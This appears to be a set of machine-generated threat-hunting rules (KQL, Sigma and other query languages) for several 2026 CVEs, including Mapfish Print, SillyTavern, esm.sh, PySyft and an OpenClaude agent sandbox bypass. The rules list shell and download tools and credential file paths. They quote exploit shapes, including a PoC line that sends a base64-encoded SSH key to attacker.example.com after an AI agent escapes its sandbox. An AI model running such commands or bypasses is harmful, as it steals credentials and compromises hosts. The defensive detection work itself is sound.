[LLM] Mapfish Print Servlet running on host — CVE-2026-44672 exposure hunt Reconnaissance High
Identifies hosts where a Java process is running the Mapfish Print servlet (org.mapfish.print:print-lib / print-servlet) by anchoring on the Maven coordinates in the JVM command line. Use the output to enumerate exposure to CVE-2026-44672 (unauthenticated RCE in the Dynamic table feature) and reconcile installed version against patched matrix: >=3.23.0<3.28.28, >=3.29.0<3.30.30, >=3.31.0<3.31.21, >=3.32.0<3.33.14, >=3.34.0<4.0.3. Rationale: Article gives Maven coordinates org.mapfish.print:print-lib and org.mapfish.print:print-servlet plus the precise vulnerable version matrix. Anchoring on those strings inside java cmdline is high-fidelity (no other product uses these coords) and the regex extracts the running version so analysts can reconcile against the patched matrix in one pass. Cross-checked against the GHSA itself plus the Mapfish Print servlet source (MapPrinterServlet.java) and Jasper template injection background. Cross-checked against: • https://github.com/advisories/GHSA-q7m6-wpvf-mvwx • https://github.com/mapfish/mapfish-print/blob/master/core/src/main/java/org/mapfish/print/servlet/MapPrinterServlet.java • https://insinuator.net/2023/06/jasper-reports-library-code-injection/
ATT&CKT1190
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName in~ ("java.exe","javaw.exe","java")
| where ProcessCommandLine has_any ("mapfish-print","print-servlet","org.mapfish.print")
| extend MapfishVersion = extract(@"(?:print-lib|print-servlet|mapfish-print)-(\d+\.\d+\.\d+)", 1, ProcessCommandLine)
| extend Cve = "CVE-2026-44672",
         Note = "Vulnerable if 3.23.0-3.28.27, 3.29.0-3.30.29, 3.31.0-3.31.20, 3.32.0-3.33.13, 3.34.0-4.0.2"
| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp),
            SampleCmd = any(ProcessCommandLine), Versions = make_set(MapfishVersion, 10)
            by DeviceName, AccountName, FileName, Cve, Note
| order by LastSeen desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where TargetProcessName has_any ("java.exe","javaw.exe","java")
| where TargetProcessCommandLine has_any ("mapfish-print","print-servlet","org.mapfish.print")
| extend MapfishVersion = extract(@"(?:print-lib|print-servlet|mapfish-print)-(\d+\.\d+\.\d+)", 1, TargetProcessCommandLine)
| extend Cve = "CVE-2026-44672"
| summarize FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            SampleCmd = any(TargetProcessCommandLine), Versions = make_set(MapfishVersion, 10)
            by DvcHostname, ActorUsername, TargetProcessName, Cve
| order by LastSeen desc

[LLM] OS shell or LOLBin spawned by Java process hosting Mapfish Print (CVE-2026-44672 exploit) Exploitation High
Hunts for command shells, scripting hosts, or recon LOLBins spawned as children of a java/javaw process whose own command line references the Mapfish Print servlet. Successful exploitation of CVE-2026-44672 (Jasper template injection in the Dynamic table feature) materialises as the JVM invoking Runtime.exec on attacker-supplied commands — visible here as java→cmd/powershell/bash/curl/whoami/etc. Rationale: The article specifies the exact Maven artifact (org.mapfish.print:print-lib / print-servlet) but no exploit-payload strings. The high-fidelity signal therefore comes from pairing (a) parent-process anchor = java/javaw whose cmdline contains the Mapfish Print coordinates with (b) child-process anchor = OS shells/LOLBins. java spawning a shell is anomalous for a Spring/Tomcat-hosted Mapfish Print process under normal operation and is the canonical post-exploitation footprint of Jasper template injection (Runtime.getRuntime().exec). Cross-checked against the Mapfish Print upstream servlet code and the Insinuator write-up on Jasper Reports template injection (same vuln class). Cross-checked against: • https://github.com/advisories/GHSA-q7m6-wpvf-mvwx • https://github.com/mapfish/mapfish-print/blob/master/core/src/main/java/org/mapfish/print/servlet/MapPrinterServlet.java • https://insinuator.net/2023/06/jasper-reports-library-code-injection/

[LLM] SillyTavern CVE-2026-44650 unauthenticated POST to vulnerable /api/extensions/* endpoints Exploitation High
Detects POST requests to the five SillyTavern endpoints vulnerable to path-traversal-via-dot ('.') wipe of the user extensions directory: /api/extensions/{delete,update,version,branches,switch}. Targets the network/web-log pivot — the exploit is a single POST that returns HTTP 200 with a body referencing 'data\default-user\extensions'. Because no auth is required in default config (basicAuthMode:false), any source IP reaching the listener is suspect. Rationale: Article-specific URI stems are verbatim from the GHSA PoC (`POST /api/extensions/delete` with body `{"extensionName":"."}`) and the explicit 'Same Pattern in Other Endpoints' list (`/update`, `/version`, `/branches`, `/switch`). No auth means a single 200-OK POST to any of these paths is exploitation. Cross-checked against the DailyCVE write-up which confirms the same five endpoints and PoC shape. Cross-checked against: • https://github.com/advisories/GHSA-886q-f44j-h6wh • https://dailycve.com/sillytavern-unauthenticated-path-traversal-directory-deletion-cve-n-a-critical/ • https://advisories.gitlab.com/pkg/npm/sillytavern/CVE-2026-34524/
ATT&CKT1190 T1485
Data sourcesWeb
// Defender XDR has no native HTTP-server access-log table; this falls back to the egress pivot: a host that *initiated* a POST to a SillyTavern listener.
// Most useful where Defender-managed clients (browsers / curl from compromised hosts) hit the vulnerable instance.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "ConnectionSuccess"
| where RemoteUrl has_any ("/api/extensions/delete","/api/extensions/update","/api/extensions/version","/api/extensions/branches","/api/extensions/switch")
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","curl.exe","powershell.exe","pwsh.exe","python.exe","node.exe")
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
// Covers IIS-fronted, App-Service-fronted, CEF/firewall, and any ASIM-normalised web telemetry feeding the SillyTavern listener.
let vulnPaths = dynamic(["/api/extensions/delete","/api/extensions/update","/api/extensions/version","/api/extensions/branches","/api/extensions/switch"]);
union isfuzzy=true
(W3CIISLog
  | where TimeGenerated > ago(7d)
  | where csMethod =~ "POST"
  | where csUriStem has_any (vulnPaths)
  | project TimeGenerated, SrcIp=cIP, DstHost=Computer, Method=csMethod, Uri=csUriStem, Status=scStatus, UserAgent=csUserAgent, Source="W3CIISLog"),
(AppServiceHTTPLogs
  | where TimeGenerated > ago(7d)
  | where CsMethod =~ "POST"
  | where CsUriStem has_any (vulnPaths)
  | project TimeGenerated, SrcIp=CIp, DstHost=CsHost, Method=CsMethod, Uri=CsUriStem, Status=ScStatus, UserAgent=UserAgent, Source="AppServiceHTTPLogs"),
(CommonSecurityLog
  | where TimeGenerated > ago(7d)
  | where RequestMethod =~ "POST"
  | where RequestURL has_any (vulnPaths)
  | project TimeGenerated, SrcIp=SourceIP, DstHost=DestinationHostName, Method=RequestMethod, Uri=RequestURL, Status=tostring(EventOutcome), UserAgent=RequestClientApplication, Source="CommonSecurityLog"),
(ImWebSession
  | where TimeGenerated > ago(7d)
  | where HttpMethod =~ "POST"
  | where Url has_any (vulnPaths)
  | project TimeGenerated, SrcIp=SrcIpAddr, DstHost=DstHostname, Method=HttpMethod, Uri=Url, Status=tostring(HttpStatusCode), UserAgent=HttpRequestHeaderUserAgent, Source="ImWebSession")
| where Status startswith "2" or Status == "200"
| order by TimeGenerated desc

Detects the destructive side-effect of CVE-2026-44650: the SillyTavern node.exe process recursively deleting files under `data\<user>\extensions\`. The GHSA PoC shows `fs.promises.rm(extensionPath, { recursive: true })` against `data\default-user\extensions` — this surfaces as a tight burst of FileDeleted events from a single node.exe PID against files under that path. Hits even when no web logs are retained. Rationale: PoC body 'Extension has been deleted at data\default-user\extensions' confirms the destructive path pattern — `<basePath>\data\<user>\extensions\`. SillyTavern is a Node app so the deleting process is `node.exe`. Threshold of 5 deletions/minute distinguishes a wipe from the single-file legitimate uninstall (which removes one extension subdir, typically 1-3 files in one event). Cross-checked against related SillyTavern path-traversal CVEs (2026-34522/-34523/-34524) which describe the same parent directory layout. Cross-checked against: • https://github.com/advisories/GHSA-886q-f44j-h6wh • https://dailycve.com/sillytavern-unauthenticated-path-traversal-directory-deletion-cve-n-a-critical/ • https://advisories.gitlab.com/pkg/npm/sillytavern/CVE-2026-34524/
ATT&CKT1485 T1190

[LLM] esm.sh CVE-2026-44593 legacy router path-traversal exploitation in web logs Exploitation High
Hunts inbound HTTP requests targeting an esm.sh deployment that combine URL-encoded path traversal (`..%2f` / `%2e%2e%2f`) with the URL-encoded fragment-bypass (`%23%2f..`) used to coerce the legacy router into writing arbitrary files via `buildStorage.Put`. The double-pattern (traversal AND fragment) is the exact signature of the PoC and is extremely unusual in normal traffic. Rationale: Built on the exact URL pattern in the GHSA PoC: every exploit URL must combine URL-encoded `../` segments (`..%2f`/`%2e%2e%2f`) with the URL-encoded fragment (`%23`) followed by more `..%2f` — that's how the path normaliser walks out of `legacy/v.../esnext/...` to `/tmp/pwned`. Either pattern alone has plausible legitimate uses (crawlers, raw fragment URIs); the combination on a single request is the exploit signature. Did not search the web — article is self-contained with a complete PoC and authoritative GHSA reference.
ATT&CKT1190 T1083 T1505.003
Data sourcesWeb.Web
// Defender XDR has no native inbound-HTTP-server table; this is best-effort
// against outbound HTTP visibility on Defender-monitored clients that may be
// internal red-teamers or attackers probing the org-hosted esm.sh.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType in ("HttpConnectionInspected","ConnectionSuccess")
| where isnotempty(RemoteUrl)
| where RemoteUrl has_any ("..%2f","..%2F","%2e%2e%2f","%2e%2e%2F")
| where RemoteUrl has_any ("%23%2f..","%23%2F..","%23/..")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc
let traversal = dynamic(["..%2f","..%2F","%2e%2e%2f","%2e%2e%2F"]);
let fragBypass = dynamic(["%23%2f..","%23%2F..","%23/.."]);
union isfuzzy=true
  ( W3CIISLog
    | where TimeGenerated > ago(7d)
    | extend FullUri = strcat(csUriStem, iff(isempty(csUriQuery), "", strcat("?", csUriQuery)))
    | where FullUri has_any (traversal) and FullUri has_any (fragBypass)
    | project TimeGenerated, Src=cIP, Host=Computer, Site=sSiteName, Uri=FullUri, Method=csMethod, Status=scStatus, UA=csUserAgent, _Source="IIS"),
  ( CommonSecurityLog
    | where TimeGenerated > ago(7d)
    | where isnotempty(RequestURL)
    | where RequestURL has_any (traversal) and RequestURL has_any (fragBypass)
    | project TimeGenerated, Src=SourceIP, Host=DestinationHostName, Site=DeviceProduct, Uri=RequestURL, Method=RequestMethod, Status=tostring(EventOutcome), UA=RequestClientApplication, _Source="CEF"),
  ( ImWebSession
    | where TimeGenerated > ago(7d)
    | where isnotempty(Url)
    | where Url has_any (traversal) and Url has_any (fragBypass)
    | project TimeGenerated, Src=SrcIpAddr, Host=DstHostname, Site=EventProduct, Uri=Url, Method=HttpMethod, Status=tostring(HttpStatusCode), UA=HttpRequestHeaderUserAgent, _Source="ASIM")
| order by TimeGenerated desc
title: esm.sh Legacy Router Path Traversal Exploitation (CVE-2026-44593)
id: 4a3d8b1c-5f2e-4b8a-9c3d-1e7f6a2b8c9d
status: experimental
description: |
  Detects inbound HTTP requests that combine URL-encoded path traversal sequences
  with the URL-encoded fragment-bypass pattern used to exploit CVE-2026-44593 in
  esm.sh. The vulnerable legacy router concatenates path components without
  sanitisation, allowing the %23 (#) fragment plus repeated ..%2f segments to
  normalise the storage key to arbitrary filesystem locations on the server.
references:
  - https://github.com/advisories/GHSA-3636-h3vx-6465

      - '..%2F'
      - '%2e%2e%2f'
      - '%2e%2e%2F'
  selection_fragment_bypass:
    cs-uri-stem|contains:

[LLM] esm.sh server writes file outside legacy storage path (CVE-2026-44593 post-exploit artefact) Installation High
Hunts file writes performed by the esm.sh server binary (or its child processes) to sensitive Linux paths outside the legitimate storage directory — the visible artefact of the arbitrary-file-write exploit chain that leads to RCE via overwritten binaries / cron / SSH authorized_keys. Pairs with UC1 to catch successful exploitation after the inbound request lands. Rationale: The article's mechanism is `buildStorage.Put` writing a normalised key like `/tmp/pwned` — i.e. ANY file landing on the host originated from the esm.sh process. Pinning to `InitiatingProcessFileName has 'esm.sh'` and then anti-allowlisting the legitimate storage directory turns this into a deployment-aware alert that fires on the post-exploit artefact. PoC explicitly writes to `/tmp/pwned`; real attackers will pivot to `/root/.ssh/authorized_keys`, cron, or `/usr/local/bin/` for RCE — all covered. Did not search the web — the GHSA advisory is the canonical source and the exploit chain is unambiguous.
ATT&CKT1190 T1574 T1098.004 T1053.003

let _sensitive_prefixes = dynamic([@"/tmp/",@"/etc/",@"/usr/bin/",@"/usr/local/bin/",@"/usr/sbin/",@"/root/",@"/var/spool/cron/",@"/etc/cron.d/",@"/etc/cron.daily/",@"/etc/cron.hourly/",@"/opt/"]);
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where InitiatingProcessFileName =~ "esm.sh"

    or InitiatingProcessFolderPath has "esm-dev"
    or InitiatingProcessCommandLine has "esm.sh"
| where not(FolderPath has_any (_esmsh_storage))
| where FolderPath has_any (_sensitive_prefixes) or FileName endswith "authorized_keys" or FolderPath has ".ssh/"

ImFileEvent

title: esm.sh Server Writes Outside Storage Path (CVE-2026-44593 Post-Exploit)
id: 7c2e9a4b-8d1f-4e5b-9a7c-3f2d8e1b4c5a
status: experimental
description: |
  Detects the esm.sh Go server (vulnerable to CVE-2026-44593) writing files to
  sensitive Linux paths outside its legitimate storage directory. The legacy
  router path-traversal lets an attacker direct buildStorage.Put to overwrite
  arbitrary files; flagging writes to /tmp, /etc, /usr/{,local}/bin, /root,
  cron locations, or any .ssh/ directory catches the resulting filesystem
  artefact regardless of which URL pattern smuggled the traversal.

[LLM] Guardrails AI CLI 'hub install' spawning shell/LOLBin child (CVE-2026-31233 post_install RCE) Installation High
Detects the exploitation step of CVE-2026-31233: a victim runs 'guardrails hub install hub://<ns>/<validator>' and the Guardrails Python CLI executes the manifest's attacker-controlled post_install script, which spawns a shell or LOLBin to stage payloads. Article-specific because we pin on the literal 'guardrails hub install' parent command line plus a non-Python/non-pip child. Rationale: Pins on the exact CLI invocation named in the advisory ('guardrails hub install', referenced in the GHSA body and confirmed via Guardrails AI docs/PyPI) and the immediate child process — the only place CVE-2026-31233's post_install code execution lands. Excluding the pip-install child kills the dominant legitimate post_install pattern. Cross-checked against: • https://pypi.org/project/guardrails-ai/ • https://guardrailsai.com/docs/getting_started/quickstart/ • https://hub.guardrailsai.com/

id: a1b2c3d4-e5f6-4789-abcd-ef0123456789

[LLM] Guardrails Hub manifest fetch correlated with 'hub install' invocation (supply-chain delivery) Delivery Medium
Hunting query that correlates outbound traffic to hub.guardrailsai.com (the manifest endpoint named in the advisory) with a same-host 'guardrails hub install' execution within a 5-minute window — the exact delivery step where CVE-2026-31233's untrusted post_install field is retrieved. Surfaces which validators are being pulled and from which hosts. Rationale: Hub domain hub.guardrailsai.com is confirmed from the Guardrails Hub web UI and validator pages (e.g. hub.guardrailsai.com/validator/guardrails/response_evaluator); the advisory text explicitly states 'the system retrieves a manifest from the Guardrails Hub'. Correlating that fetch with the literal 'guardrails hub install' parent command within a 5-min window filters out passing DNS lookups and surfaces real install attempts. Cross-checked against: • https://hub.guardrailsai.com/ • https://guardrailsai.com/docs/getting_started/quickstart/ • https://deepwiki.com/guardrails-ai/guardrails/1.1-getting-started

    | project DeviceId, DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
)
| order by DeviceName asc

[LLM] Horovod worker (python) spawning shell child — post-pickle RCE via KVStore (CVE-2026-31234) Exploitation High
Detects a Python process running Horovod that spawns a shell, cmd.exe or powershell.exe. After exploitation of the unauthenticated KVStore HTTP server, the malicious cloudpickle payload is deserialized inside the worker via cloudpickle.loads() and typically executes os.system / subprocess.Popen, producing a shell child of a Horovod python process. Rationale: Article identifies cloudpickle.loads() in horovod KVStore worker as the deserialization sink. Successful pickle exploitation gadgets almost always reduce() to os.system / subprocess.Popen, so the host-side signal is a python parent (running horovod) spawning a shell or LOLBin child — a tight, behavior-aligned detection that doesn't depend on the (unknown / dynamic) KVStore port. Cross-checked against GHSA-mf8f-x4r3-jm8c and Horovod runner source layout (horovod.runner / horovod.run module names) for the parent-cmdline tokens. Cross-checked against: • https://github.com/advisories/GHSA-mf8f-x4r3-jm8c • https://cwe.mitre.org/data/definitions/502.html • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1059.004 T1059.001

id: a3c4d5e6-7f89-4012-bc34-d5e6f7890123
description: Detects a Python process executing Horovod that spawns a shell, cmd, PowerShell or download utility — indicative of cloudpickle.loads() deserialization RCE through the unauthenticated KVStore HTTP server (CVE-2026-31234).
references:
  - https://github.com/advisories/GHSA-mf8f-x4r3-jm8c

detection:
  parent_python:
    ParentImage|endswith:
      - '\python.exe'
      - '/python'
      - '/python3'
      - '/python3.8'
      - '/python3.9'
      - '/python3.10'
      - '/python3.11'
      - '/python3.12'
  horovod_context:
    ParentCommandLine|contains:
      - 'horovod'
      - 'horovodrun'
      - 'horovod.runner'
      - 'horovod.run'

    Image|endswith:

      - '/bash'
      - '/dash'

      - '/wget'
      - '/curl'

  condition: parent_python and horovod_context and child_shell

[LLM] Vulnerable Horovod (≤0.28.1) package inventory — CVE-2026-31234 exposure Reconnaissance Medium
Hunting query that surfaces managed devices on which the vulnerable pip:horovod package (≤0.28.1) is installed, so the SOC can prioritise patching, network-segment the KVStore port, or hunt for in-the-wild exploitation against those specific hosts. Rationale: GHSA names pip:horovod ≤0.28.1 as the affected package; the only operational pivot for advisory-driven hunting is the inventory side. Defender TVM (DeviceTvmSoftwareVulnerabilities) is the canonical KQL source for CVE-tagged inventory and joins cleanly to DeviceInfo.IsInternetFacing to prioritise externally-reachable hosts where the unauthenticated KVStore HTTP server matters most. The semver-range regex catches inventories where Defender lacks the CVE mapping but software/version are still indexed. Cross-checked against: • https://github.com/advisories/GHSA-mf8f-x4r3-jm8c • https://nvd.nist.gov/vuln/detail/CVE-2026-31234

[LLM] High-fan-out successful Digest authentication to Tomcat — CVE-2026-43512 exploitation Exploitation Medium
Detects a single source IP successfully authenticating with the HTTP Digest scheme as many distinct usernames to a Tomcat-served endpoint within a short window. Pre-patch (CVE-2026-43512), any unknown username succeeds when the offered password is literal 'null', so adversaries iterate through admin-style usernames hoping to land on one mapped to a privileged role. Rationale: Article confirms the vuln triggers on the *literal password 'null'* against ANY unknown username, so exploitation must enumerate usernames (each request still encodes a unique MD5 response per nonce/user, so unsuccessful guesses look the same — the discriminator is many distinct *authenticated* usernames from one source). MITRE T1190 + T1110.001 mapping cross-checked against ATT&CK for web-app auth-bypass campaigns. Tomcat access-log username field (`%u` in combined format) directly records the authenticated principal — the signal CVE-2026-43512 will splash all over. Cross-checked against: • https://www.mail-archive.com/announce@tomcat.apache.org/msg00778.html • https://seclists.org/oss-sec/2026/q2/495 • https://tomcat.apache.org/tomcat-11.0-doc/config/valve.html#Access_Logging
ATT&CKT1190 T1110.001 T1078
Data sourcesWeb.Web Authentication.Authentication

    (W3CIISLog

        | where array_length(TomcatHosts) == 0 or Computer in (TomcatHosts)
        | project TimeGenerated, src=cIP, dest=Computer, user=csUserName, uri=csUriStem, status=scStatus),
    (CommonSecurityLog
        | where TimeGenerated > ago(1d)
        | where DeviceProduct has_any ("Tomcat","Apache","NGINX","HAProxy","F5","AppGW")
        | where isnotempty(SourceUserName) and SourceUserName != "-"
        | where EventOutcome in ("200","302","303") or DeviceAction =~ "allow"
        | project TimeGenerated, src=SourceIP, dest=DestinationHostName, user=SourceUserName, uri=RequestURL, status=EventOutcome)
| summarize DistinctUsers=dcount(user), Users=make_set(user, 50), URIs=make_set(uri, 20), Hits=count()
          by src, dest, bin(TimeGenerated, WindowMin)
| where DistinctUsers >= MinDistinctUsers
| extend Signature="CVE-2026-43512 Tomcat DIGEST auth fan-out"
| order by DistinctUsers desc, TimeGenerated desc

[LLM] PySyft server Python process spawning shell/LOLBin (CVE-2026-31220 post-exploit RCE) Exploitation High
Hunts for a Python process running the PySyft Datasite/Server (cmdline containing 'syft') spawning a shell or LOLBin. A long-lived PySyft server should never legitimately invoke cmd.exe, powershell, bash, curl, wget, certutil, etc.; this child-process pivot catches exec()/eval() of approved-but-malicious user code dropping to OS commands. Rationale: Anchors on the only article-specific identifier available — the syft Python package (pip:syft) — by matching parent Python interpreters whose cmdline contains 'syft', combined with a high-fidelity child pivot (shell/LOLBin) that a long-lived PySyft Datasite has no business spawning. Cross-checked GHSA-cfpg-c974-jfhq and pypi.org/project/syft for the package name and the syft_function decorator pattern noted in CWE-94 advisory. Cross-checked against: • https://github.com/advisories/GHSA-cfpg-c974-jfhq • https://pypi.org/project/syft/
ATT&CKT1190 T1059 T1203
Data sourcesEndpoint.Processes
let ShellLolbins = dynamic(["cmd.exe","powershell.exe","pwsh.exe","bash","sh","dash","zsh","nc","ncat","netcat","curl","wget","certutil.exe","bitsadmin.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe"]);
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","uvicorn","gunicorn")
| where InitiatingProcessCommandLine has_any ("syft","-m syft","syft.server","syft.service","syft.client")
| where FileName in~ (ShellLolbins)
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
let ShellLolbins = dynamic(["cmd.exe","powershell.exe","pwsh.exe","bash","sh","dash","zsh","nc","ncat","netcat","curl","wget","certutil.exe","bitsadmin.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe"]);
ImProcessCreate
| where TimeGenerated > ago(7d)
| extend ParentBase = tolower(tostring(split(ParentProcessName, "\\")[-1]))
| extend ParentBase = iff(ParentBase == "", tolower(tostring(split(ParentProcessName, "/")[-1])), ParentBase)
| where ParentBase in ("python.exe","python3.exe","python","python3","uvicorn","gunicorn")
| where ParentProcessCommandLine has_any ("syft","-m syft","syft.server","syft.service","syft.client")
| extend ChildBase = tolower(tostring(split(TargetProcessName, "\\")[-1]))
| extend ChildBase = iff(ChildBase == "", tolower(tostring(split(TargetProcessName, "/")[-1])), ChildBase)
| where ChildBase in (ShellLolbins)
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine, Hash

id: a7c4f6d8-3e1b-4d9a-9b8c-1f2e3d4a5b6c
status: experimental
description: Detects a Python process running PySyft (Datasite/Server, cmdline contains 'syft') spawning a shell or LOLBin, indicating exploitation of CVE-2026-31220 where approved user-submitted code reaches the OS via exec()/eval().

logsource:
  category: process_creation
detection:
  parent_pysyft:
    ParentImage|endswith:
      - '\python.exe'
      - '\python3.exe'
      - '/python'
      - '/python3'
      - '/uvicorn'
      - '/gunicorn'
    ParentCommandLine|contains:
      - 'syft'
  child_shell:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\wmic.exe'
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/nc'
      - '/ncat'
      - '/netcat'
      - '/curl'
      - '/wget'
  condition: parent_pysyft and child_shell
falsepositives:
  - PySyft administrators running approved integration tests that legitimately shell out
  - Containerised CI jobs invoking PySyft alongside shell tooling
level: high
(source:windows.sysmon OR source:linux.auditd) AND ((@ParentImage:(*\\python.exe OR *\\PYTHON.EXE OR *\\python3.exe OR *\\Python.exe) OR @process.parent.executable.path:(*/python OR */python3 OR */uvicorn OR */gunicorn)) AND (@ParentCommandLine:*syft* OR @process.parent.command_line:*syft*) AND (@Image:(*\\cmd.exe OR *\\CMD.EXE OR *\\powershell.exe OR *\\PowerShell.exe OR *\\POWERSHELL.EXE OR *\\pwsh.exe OR *\\certutil.exe OR *\\bitsadmin.exe OR *\\mshta.exe OR *\\rundll32.exe OR *\\regsvr32.exe OR *\\wmic.exe OR *\\curl.exe OR *\\wget.exe) OR @process.executable.path:(*/bash OR */sh OR */dash OR */zsh OR */nc OR */ncat OR */netcat OR */curl OR */wget)))
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(python(\d|3)?(\.exe)?|uvicorn|gunicorn)$/i ImageFileName=/(\\(cmd|powershell|pwsh|certutil|bitsadmin|mshta|rundll32|regsvr32|wmic|curl|wget)\.exe$)|(\/(bash|sh|dash|zsh|nc|ncat|netcat|curl|wget)$)/i
| join({#event_simpleName=ProcessRollup2 | regex("syft", field=CommandLine) | rename(field=TargetProcessId, as=ParentProcessId_) | select([aid, ParentProcessId_, CommandLine])}, field=[aid, ParentProcessId], key=ParentProcessId_, include=[CommandLine], mode=inner)
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

[LLM] PySyft Datasite server writing executable/persistence artifacts to disk (CVE-2026-31220 payload drop) Installation Medium
Hunts a Python process running PySyft (cmdline contains 'syft') writing executables, scripts, scheduled-task XML, or SSH/cron persistence files. After CVE-2026-31220 RCE, the attacker's approved code can dump a payload or persistence hook from inside the server process — a behaviour the legitimate PySyft Datasite never exhibits. Rationale: Pivots on the only concrete article anchors — syft package + Python host process — and looks for file writes to file types (.exe/.dll/.sh/.elf) or paths (cron, systemd, SSH authorized_keys, Scheduled Tasks) that a federated-ML server has no legitimate reason to touch. Together with UC1 (child-process pivot) this covers the two highest-yield post-RCE artefacts; cross-checked GHSA-cfpg-c974-jfhq classification (CWE-94 code injection) and pypi.org/project/syft package metadata. Cross-checked against: • https://github.com/advisories/GHSA-cfpg-c974-jfhq • https://pypi.org/project/syft/
ATT&CKT1105 T1547.001 T1053.003 T1098.004

| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","uvicorn","gunicorn")
| where InitiatingProcessCommandLine has_any ("syft","-m syft","syft.server","syft.service")
| where (FileName endswith ".exe" or FileName endswith ".dll" or FileName endswith ".bat" or FileName endswith ".ps1" or FileName endswith ".sh" or FileName endswith ".elf")
      or FolderPath has_any (@"\Windows\System32\Tasks\", @"\Users\Public\", @"\ProgramData\", "/etc/cron", "/etc/systemd/system/", "/.ssh/authorized_keys", "/usr/local/bin/", "/tmp/")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, AccountName = InitiatingProcessAccountName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          ActionType, FileName, FolderPath, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType in ("FileCreated","FileModified","FileCreate")
| extend ActingBase = tolower(tostring(split(ActingProcessName, "\\")[-1]))
| extend ActingBase = iff(ActingBase == "", tolower(tostring(split(ActingProcessName, "/")[-1])), ActingBase)
| where ActingBase in ("python.exe","python3.exe","python","python3","uvicorn","gunicorn")
| where ActingProcessCommandLine has_any ("syft","-m syft","syft.server","syft.service")
| where (TargetFileExtension in~ ("exe","dll","bat","ps1","sh","elf"))
      or TargetFilePath has_any (@"\Windows\System32\Tasks\", @"\Users\Public\", @"\ProgramData\", "/etc/cron", "/etc/systemd/system/", "/.ssh/authorized_keys", "/usr/local/bin/", "/tmp/")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256

[LLM] OpenClaude (CVE-2026-42074) Sandbox Bypass — Credential Read + Network Exfil from Node Agent Actions on Objectives High
Hunts the article's PoC chain: a child shell spawned by the OpenClaude Node CLI (`node ... cli.mjs`) that reads SSH/cloud/secret material (`~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`, `/etc/shadow`) and/or pipes through `base64` into `curl`/`wget`. With sandbox bypassed, these commands hit the host directly and become visible in normal process telemetry. Rationale: Article PoC is exact: `cat /etc/hostname && curl http://attacker.example.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)`. The parent will be the OpenClaude Node CLI (`node /app/dist/cli.mjs --auto` per the integration test in the advisory), and the bypass makes the resulting shell visible as a normal child process. Combination of agent-parent + credential file path + base64-into-egress is what makes this article-specific and high-fidelity — bare 'curl with base64' or bare 'read id_rsa' would each be too noisy alone.
ATT&CKT1552.004 T1041 T1059.004 T1480
Data sourcesEndpoint.Processes
// CVE-2026-42074 — OpenClaude post-bypass exfil child process
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node.exe","node","node.js")
| where InitiatingProcessCommandLine has_any ("cli.mjs","/app/dist/cli","claude","openclaude")
| where ProcessCommandLine has_any (".ssh/id_rsa",".ssh/id_ed25519",".ssh/id_ecdsa",".aws/credentials",".kube/config","/etc/shadow","/etc/passwd","GITHUB_TOKEN","GOOGLE_APPLICATION_CREDENTIALS")
   or (ProcessCommandLine has "base64" and ProcessCommandLine has_any ("curl ","wget "," nc ","|nc "))
   or (ProcessCommandLine has_any ("curl ","wget ") and ProcessCommandLine matches regex @"(?i)\$\(\s*cat\s+[~/].*(id_rsa|credentials|config|token)")
| project Timestamp, DeviceName, AccountName,
          AgentParent = InitiatingProcessFileName,
          AgentParentCmd = InitiatingProcessCommandLine,
          ChildShell = FileName,
          ChildCmd = ProcessCommandLine,
          SHA256, FolderPath
| order by Timestamp desc
// CVE-2026-42074 — OpenClaude post-bypass exfil child process (ASIM, cross-vendor)
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("node","node.exe","node.js")
| where ParentProcessCommandLine has_any ("cli.mjs","/app/dist/cli","claude","openclaude")
| where TargetProcessCommandLine has_any (".ssh/id_rsa",".ssh/id_ed25519",".ssh/id_ecdsa",".aws/credentials",".kube/config","/etc/shadow","/etc/passwd","GITHUB_TOKEN","GOOGLE_APPLICATION_CREDENTIALS")
